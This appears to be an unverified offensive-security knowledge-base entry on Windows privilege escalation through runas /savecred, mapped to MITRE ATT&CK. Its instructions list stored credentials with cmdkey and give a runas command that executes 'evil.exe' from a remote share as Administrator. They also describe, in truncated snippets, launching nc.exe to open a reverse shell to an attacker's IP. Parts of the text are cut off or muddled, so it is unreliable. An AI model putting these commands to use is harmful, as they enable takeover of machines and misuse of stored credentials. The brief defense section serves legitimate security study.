---
id: 86e202cf-5ad3-4d5f-96ca-ba31d1a31506
name: Windows Privilege Escalation via Runas
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:29.963367+00:00'
updated_at: '2023-04-10T20:37:41.330953+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
- '[[Persistence|TA0003 - Persistence]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Exploitation for Privilege Escalation|T1068 - Exploitation for Privilege Escalation]]'
- '[[Scheduled Task|T1053 - Scheduled Task]]'
- '[[Windows Management Instrumentation|T1047 - Windows Management Instrumentation]]'
tags:
- '[[EoP - Runas]]'
- '[[Windows - Privilege Escalation]]'
commands:
- '[[Adding a new credential]]'
- '[[Deleting a stored credential]]'
- '[[List currently stored credentials]]'
- '[[Listing stored credentials]]'
- '[[Run application as admin]]'
- '[[Run a program as a different user account]]'
- '[[Save Credentials]]'
---

# Windows Privilege Escalation via Runas

## Summary

Windows Privilege Escalation via Runas is a technique used by attackers to elevate their privileges on a compromised system. This technique involves using the Runas command to execute a process with elevated privileges. Attackers can use this technique to bypass access controls and gain access to s

## Description

# Description

Windows Privilege Escalation via Runas is a technique used by attackers to elevate their privileges on a compromised system. This technique involves using the Runas command to execute a process with elevated privileges. Attackers can use this technique to bypass access controls and gain access to sensitive data or systems. From a technical perspective, this technique involves running a command with the /savecred option to store the user's credentials, and then using the Runas command to execute a process with those stored credentials. This technique can be used to bypass access controls and gain access to sensitive data or systems. From a business perspective, this technique can result in data theft or system compromise, leading to financial loss, reputational damage, and legal liability.

 

## Requirements

1. Access to a compromised Windows system

1. Knowledge of Runas command and /savecred option

 

## Defense

1. Limit user privileges to prevent unauthorized use of the Runas command

1. Monitor for suspicious use of the Runas command and /savecred option

1. Implement multi-factor authentication to prevent unauthorized access to user credentials

 

## Objectives

1. Elevate privileges on a compromised system

1. Bypass access controls

1. Gain access to sensitive data or systems

 

# Instructions

1. cmdkey

 



**Code**: [[cmdkey]]



> The cmdkey command is used to manage stored usernames and passwords for remote computer connections in Windows. The command can be used to add, delete, or display stored credentials. The command is helpful for automating remote computer connections and avoiding the need to enter credentials manually each time.



**Command** ([[Listing stored credentials]]):

```bash
cmdkey /list
```





**Command** ([[Adding a new credential]]):

```bash
cmdkey /add:target /user:user /pass:password
```





**Command** ([[Deleting a stored credential]]):

```bash
cmdkey /delete:target
```



2. Use the 'cmdkey /list' command to list all currently stored credentials on the machine.

 



**Code**: [[cmdkey /list
Currently stored credentials:
 Target]]



> This command displays a list of all currently stored credentials on the machine. It includes information such as the target, domain, user, and type of credential. This can be useful for troubleshooting authentication issues or for managing stored credentials.



**Command** ([[List currently stored credentials]]):

```bash
cmdkey /list
```



3. runas <username> <command>

 



**Code**: [[runas]]



> The runas command allows you to run a command as a different user. You will need to provide the username of the account you want to use to run the command. This command is useful when you need to run a command with elevated permissions or when you need to run a command as a different user for testing purposes.



**Command** ([[Run application as admin]]):

```bash
runas /user:admin_account cmd
```



4. savecred command saves the credentials for a network connection so that Windows can automatically log on to the network in future sessions.

 



**Code**: [[/savecred]]



> The /savecred command saves the credentials for a network connection so that Windows can automatically log on to the network in future sessions. This command is useful when you frequently access a network resource that requires authentication and you do not want to enter the credentials every time you access the resource. When you use the /savecred command, Windows prompts you to enter the user name and password for the network connection. Once you enter the credentials, Windows saves them and uses them to log on to the network automatically in future sessions.



**Command** ([[Save Credentials]]):

```bash
/savecred
```



5. To execute evil.exe as Administrator and check the current user, follow these steps:
1. Open PowerShell as an Administrator.
2. Copy and paste the following command:
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
runas /savecred /user:Administrator "cmd.exe /k whoami"
3. Replace the IP address '10.XXX.XXX.XXX' with the actual IP address of the target machine.
4. Press Enter to execute the command.
5. If successful, the evil.exe file will be executed as Administrator and the current user will be displayed in the command prompt.

 



**Code**: [[runas /savecred /user:WORKGROUP\Administrator "\\1]]



> This command is used to execute an evil.exe file as the Administrator user on a remote machine. The 'runas' command is used to run the program with different user credentials. The '/savecred' option saves the credentials so that the user doesn't have to enter them again in the future. The '/user' option specifies the user account to use for running the program. The first 'runas' command is used to execute the evil.exe file with the Administrator user. The second 'runas' command is used to execute the 'whoami' command as the Administrator user to check the current user of the system.

6. The Run As command is used to run a program or command as a different user account.

 



**Code**: [[runas]]



> The Run As command is used to run a program or command as a different user account. This can be useful in situations where a user does not have the necessary permissions to run a command or program. The command requires the user to provide the username and password of the account they want to run the command as. The syntax for the command is as follows: 

runas /user:username command

Where 'username' is the name of the user account and 'command' is the program or command that the user wants to run. Once the command is executed, the user will be prompted to enter the password for the specified user account. If the correct password is provided, the program or command will be executed with the permissions of the specified user account.



**Command** ([[Run a program as a different user account]]):

```bash
RUNAS [/profile] [/env] [/netonly] /user:<UserName> program
```



7. This command is used to escalate privileges on a Windows system. It uses the 'runas' command to execute a command as a different user. In this case, it executes the 'nc.exe' tool as a user with higher privileges to open a reverse shell to the attacker's IP address.

 



**Code**: [[C:\Windows\System32\runas.exe /env /noprofile /use]]



> The command requires the following arguments:
- <username>: the username of the account with higher privileges.
- <password>: the password for the account with higher privileges.
- <attacker-ip>: the IP address of the attacker's machine to which the reverse shell will be opened.

Note: This command should be used with caution as it can be detected by anti-virus software and is not guaranteed to work on all systems.

8. This command is used to execute commands on a remote Windows system. The command requires the following arguments:
1. password: The password of the user account with administrative privileges on the remote system.
2. user: The username of the user account with administrative privileges on the remote system.
3. hostname: The hostname or IP address of the remote system.
4. attacker_ip: The IP address of the system from which the command is being executed.

The command uses the nc.exe utility to establish a reverse shell on the remote system, allowing for remote execution of commands.

 



**Code**: [[$secpasswd = ConvertTo-SecureString "<password>" -]]



> The command first converts the password provided into a secure string and creates a new PowerShell credential object using the provided username and secure password. The command then specifies the hostname of the remote system and uses the Start method of the System.Diagnostics.Process class to execute the nc.exe utility on the remote system. The utility establishes a reverse shell connection to the IP address of the system from which the command is being executed, allowing for remote execution of commands.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]
- [[Persistence|TA0003 - Persistence]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Exploitation for Privilege Escalation|T1068 - Exploitation for Privilege Escalation]]
- [[Scheduled Task|T1053 - Scheduled Task]]
- [[Windows Management Instrumentation|T1047 - Windows Management Instrumentation]]

## Commands Used

- [[Adding a new credential]]
- [[Deleting a stored credential]]
- [[List currently stored credentials]]
- [[Listing stored credentials]]
- [[Run application as admin]]
- [[Run a program as a different user account]]
- [[Save Credentials]]

## Tags

- [[EoP - Runas]]
- [[Windows - Privilege Escalation]]


